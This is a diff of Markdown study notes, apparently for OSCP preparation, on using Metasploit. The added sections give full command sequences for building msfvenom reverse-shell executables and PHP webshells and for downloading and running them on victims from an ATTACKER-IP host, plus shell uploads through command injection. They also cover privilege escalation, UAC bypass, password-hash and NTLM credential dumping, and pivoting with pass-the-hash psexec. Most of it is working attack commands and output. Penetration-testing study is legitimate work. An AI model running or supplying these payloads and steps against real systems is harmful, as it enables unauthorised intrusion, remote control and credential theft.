@@ -35,7 +35,7 @@ List, add new and activate workspaces
 * -v verbose workspace listing
 * workspace [name] switch to workspace
 
-```plain
+```shell
 workspace
 workspace -a oscppen200
 workspace -d oscppen100
@@ -44,7 +44,7 @@ workspace oscppen200
 
 DB NMap Wrapper
 
-```plain
+```shell
 db_nmap --help
  [*] Usage: db_nmap [--save | [--help | -h]] [nmap options]
 
@@ -72,7 +72,7 @@ The modules all follow a common slash-delimited hierarchical syntax (module type
 
 SMB Scanner
 
-```plain
+```shell
 show auxiliary
 
 # Scan SMB Version
@@ -94,14 +94,16 @@ unset RHOSTS
 
 run 
   [*] Auxiliary module execution completed
+```
 
+```plain
 vulns
   7429/overview-of-server-message-block-signing
 ```
 
 Brute Force SSH Logins
 
-```plain
+```shell
 show auxiliary
 search type:auxiliary ssh
   16  auxiliary/scanner/ssh/ssh_login                                        normal  No     SSH Login Check Scanner
@@ -119,7 +121,9 @@ set PASS_FILE /usr/share/wordlists/rockyou.txt
 run
   [*] 192.168.55.110:22 - Starting bruteforce
   [+] 192.168.55.110:22 - Success: 'someuser:mypasswd' 'uid=1001(george)
+```
 
+```plain
 creds
   host            origin          service       public  private    realm
   ----            ------          -------       ------  -------    ----
@@ -128,7 +132,7 @@ creds
 
 ### Exploit Modules
 
-```plain
+```shell
 workspace -a exploits
 
 show exploits
@@ -185,7 +189,7 @@ List and interact with and kill sessions
 * -i index interact with session
 * -k index kill session
 
-```plain
+```shell
 # Session to background or close N
 ^Z
 Background session 2? [y/N]  N
@@ -219,7 +223,7 @@ Scenarios
 * Use with meterpreter -> *non-staged payload*
 * else *non-staged payload*
 
-```plain
+```shell
 msf6 exploit(multi/http/apache_normalize_path_rce) >
 
 # '/' after shell indicates stage payloads
@@ -257,7 +261,7 @@ Scenarios
 * 🔀 Pivot—use a hacked machine to attack others in the same network
 * 🎛️ Interact with the machine via command execution, shell access, or graphical
 
-```plain
+```shell
 msf6 exploit(multi/http/apache_normalize_path_rce) >
 show payloads
 
@@ -292,7 +296,7 @@ List and interact with and kill channels
 * -i index interact with session
 * -k index kill session
 
-```plain
+```shell
 meterpreter >
 channel -l
 channel -i 1
@@ -301,7 +305,7 @@ channel -k 1
 
 File System Commands download, upload and System Commands executions
 
-```plain
+```shell
 meterpreter > help
 
   Stdapi: File system Command
@@ -351,7 +355,7 @@ execute /tmp/unix-privesc-check
 
 Meterpreter HTTPS
 
-```plain
+```shell
 msf6 exploit(multi/http/apache_normalize_path_rce) >
 show payloads
 
@@ -371,7 +375,325 @@ run
 
 ## Executeable Payloads
 
+Metasploit provides a standalone (msfvenom)[https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html] to create various types of payloads for different platforms. The tool msfvenom allows to create executeable files for client-side attacks and *webshells* to exploit website vulnerabilities.s
+
+Basic usage
+
+```shell
+# list built-in payload
+msfvenom -l payloads --platform windows --arch x64
+
+# list payload options
+msfvenom -p windows/meterpreter/reverse_tcp --list-options
+
+# use built-in payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=ATTACKER-IP lport=4444 -f exe -o /tmp/my_payload.exe
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=ATTACKER-IP LPORT=443 -f exe -o met.exe
+
+# use '-' to load custom payloads
+cat payload_file.bin | ./msfvenom --payload - --arch x86 --platform win --encoder x86/shikata_ga_nai --format raw
+
+# use '--bad-chars' to avoid bad characters like '\x00'
+msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
+
+# use '--nopsled' Prepend a nopsled of [length] size on to the payload
+msfvenom -p windows/meterpreter/bind_tcp --nosled 90 -f exe
+
+# chain msfvenom payload outputs
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
+msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
+msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
+```
+
+Hands-on "non-staged payloads"
+
+Scenario
+
+* use msfvenom to create a nonstaged.exe with shell_reverse_tcp
+* host the nonstaged.exe file using python webserver
+* use netcat to setup  listener on port 443
+* download file onto victim using powershell and execute it
+
+Attacker
+
+```shell
+# 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f exe -o nonstaged.exe
+python3 -m http.server 80
+nc -nvlp 443
+```
+
+Victim
+
+```pwsh
+iwr -uri http://ATTACKER-IP/nonstaged.exe -Outfile nonstaged.exe
+```
+
+Hands-on "staged payloads" with Metasploit multi/handlers module
+
+Scenario
+
+Requires **msf6 > use multi/handler** module
+
+* use msfvenom to create a staged.exe with shell/reverse_tcp 
+* host the nonstaged.exe file using python webserver
+* use multi/handler to setup listener with payload shell/reverse_tcp 
+* download file onto victim using powershell and execute it
+
+Attacker
+
+```shell
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f exe -o staged.exe
+python3 -m http.server 80
+
+msf6 exploit(multi/http/apache_normalize_path_rce) >
+
+use multi/handler
+set payload windows/x64/shell/reverse_tcp
+set LHOST ATTACKER-IP
+set LPORT 443
+run
+```
+
+Victim
+
+```pwsh
+iwr -Uri http://ATTACKER-IP/staged.exe -Out staged.exe
+./staged.exe
+
+```
+
+Hand-on "webshell payloads" with Metasploit multi/handlers module
+
+Scenario:
+
+Requires **msf6 > use multi/handler** module
+
+* enumerate website to find file upload or command injection vulnerability
+* use msfvenom to create a staged webshell with php/meterpreter/reverse_tcp
+* use multi/handler to setup listener with php/meterpreter/reverse_tcp
+* use curl to upload the webshell.php and trigger it on vulnerable website
+
+Attacker
+
+```shell
+# enumerate website
+gobuster dir -u http://victim.com -w /usr/share/wfuzz/wordlist/general/megabeast.txt
+
+
+# list built-in webshell payloads
+msfvenom -l payloads | grep -P "( php/| nodejs/| java/| python/| firefox)"
+
+msfvenom -p php/meterpreter/reverse_tcp --list-options
+msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER-IP LPORT=4444 -f raw > webshell.php
+
+# very important: look into the file an remove save guards like comments
+gedit webshell.pHP
+head -c 10 webshell.pHP 
+ <?php error
+tail -c 10 webshell.pHP
+ die(); ?>
+
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST ATTACKER-IP
+set LPORT 4444
+run
+
+# upload file directly and run it with curl
+curl -F "file=@webshell.php" http://victim.com/upload.php
+curl -G http://victim.com/upload/webshell.php
+
+#  upload using linux os command injection and run it with php
+python3 -m http.server 80 
+curl -G http://victim.com/list.php?path=. ; wget -O /tmp/webshell.php http://ATTACKER-IP/webshell.php ;
+curl -G http://victim.com/list.php?path=/tmp ; php -f /tmp/webshell.php
+
+# upload using windows os command injection with powershell
+python3 -m http.server 80
+curl -G http://victim.com:8000/gitclone.php?path=https://github.com/microsoft/markitdown ; powershell iwr -Uri http://ATTACKER-IP/webshell.pHP -Out C:/xampp/htdocs/dashboard/webshell.pHP; ls C:/xampp/htdocs/dashboard/
+curl -G http://victim.com/upload/webshell.php
+
+meterpreter > sysinfo
+```
 
 ## Performing Post-Exploitation with Metasploit
 
+Scenario:
+
+* Requires: existing meterpreter session
+* Meterpreter (non-)staged payload has been deployed initialize a sessions
+* Privilege escalation with getsystem
+* Hidden Process executions to migrate meterpreter in other processes
+* Protect against session termination and observations
+
+```shell
+meterpreter > idletime
+User has been idle for: 4 mins 12 secs
+
+# getsystem nt/authority requires SeImpersonatePrivilege
+meterpreter > shell
+C:\user\xxx > whoami /Priv
+   SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+meterpreter > getsystem
+ ...got system via technique
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+# exectute a program to run hidden (-H)
+meterpreter > execute -H -f notepad
+
+# migrate meterpreter into another process to hide and persist connection
+meterpreter > ps
+meterpreter > migrate notepad-PROCESS-ID
+
+# dump SAM (windows)
+meterpreter > hashdump
+
+# run powershell with policy bypass to check token integrity level
+meterpreer > shell
+powershell -ep bypass
+Import-Module NtObjectManager
+Get-Command -Module NtObjectManager | Select-String "IntegrityLevel"
+Get-NtTokenIntegrityLevel
+ Medium
+
+# show desktop in realtime
+meterpreter > screenshare
+
+```
+
+## Post Exploitation Modules and Extensions
+
+```bash
+# read hosts file
+use post/windows/gather/enum_hostfile
+set SESSION 7
+run
+
+# get envrionment variables
+use post/multi/gather/env
+msf6 post(multi/gather/env) > 
+set SESSION 7
+msf6 post(multi/gather/env) > run
+
+# bypass uac and check token level high
+search window local bypassuac
+use exploit/windows/local/bypassuac_sdclt
+set SESSION 7
+set LHOST ATTCKER-IP
+run
+meterpreter > shell
+powershell -ep bypass "Import-Module NtObjectManager; if((Get-NtTokenIntegrityLevel).ToString() -eq 'High') {'[*] Successully bypassed UAC!'}"
+
+# load extension modules e.g. the mimikatz like kiwi
+meterpreter > load kiwi
+meterpreter > help
+  creds_msv              Retrieve LM/NTLM creds (parsed)
+creds_msv
+Username  Domain  NTLM                              SHA1
+--------  ------  ----                              ----
+offsec    OFFSEC  167cf9218519a1209efc0b4bc1486a18  2f92bb1c2a2526a680122ea1b645c46093a0d837s
+```
+
+## Pivoting with Metasploit
+
+Lateral movement (=pivot): Use an existing session to scan and attack targets in the network behind the compromised remote machine
+
+Scenario
+
+* Requires: Require meterpreter session on remote machine
+* Use ifconfig to list interfaces on the remote machine
+* Use route to add a route to network reachable form remote
+* Use meterpreter session ID as gateway for lateral movement
+* Start auxiliary portscan on the target network
+* Start exploiting targets connected to the compromised remote machine
+
+```bash
+# auto route 
+use post/multi/manage/autoroute
+set session 1
+run
+
+# add routes manually
+meterpreter > 
+ifconfig
+  ...
+  IPv4 Address : 172.16.189.199
+bg
+[*] Backgrounding session 55...
+msf6 >
+route flush
+route add 172.16.189.0/24 55
+route print
+
+# use aux port scanning to scan target network 
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 172.16.189.200
+set PORTS 445,3389
+
+# use smb psexec exploit with found credentials to pivot to target
+# use pass-the-hash instead if password is unknown
+# important: set payload bind shell, cause reverse shell can NOT find a route to attacker
+use exploit/windows/smb/psexec
+set SMBUser user
+set SMBPass passwort or
+set SMBPass NTLM_hash e.g.
+set SMBPass 00000000000000000000000000000000:545414c16b5689513d4ad8234391aacf
+set RHOSTS VICTIM-IP
+set PAYLOAD windows/x64/meterpreter/bind_tcp
+set LPORT 8080
+
+# did not work!
+# use aux socks proxy to run applications outside of metasploit
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set VERSION 5
+run -j
+proxychains ...
+
+# use port forward for a single port e.g. RDP
+portfwd
+portfwd add -l 3389 -p 3389 -r 172.16.189.200
+sudo xfreerdp3 /v:127.0.0.1 /u:user
+
+```
+
 ## Automating Metasploit
+
+Advance Options
+
+```bash
+msf6 (multi/handler)>
+show advanced
+
+# auto migrate to notepad
+set AutoRunScript post/windows/manage/migrate 
+
+# listen for multiple session
+set ExitOnSession false
+
+# run in background wait for interactions
+run -z -j
+```
+
+Run automation resource scripts
+
+```bash
+cat https_multi_handler.rc
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter_reverse_https
+set LHOST 192.168.145.234
+set LPORT 443
+set AutoRunScript post/windows/manage/priv_migrate 
+set ExitOnSession false
+run -z -j
+
+# Run resource file
+sudo msfconsole -r https_multi_handler.rc
+
+# More resource files here
+ls -l /usr/share/metasploit-framework/scripts/resource
+```
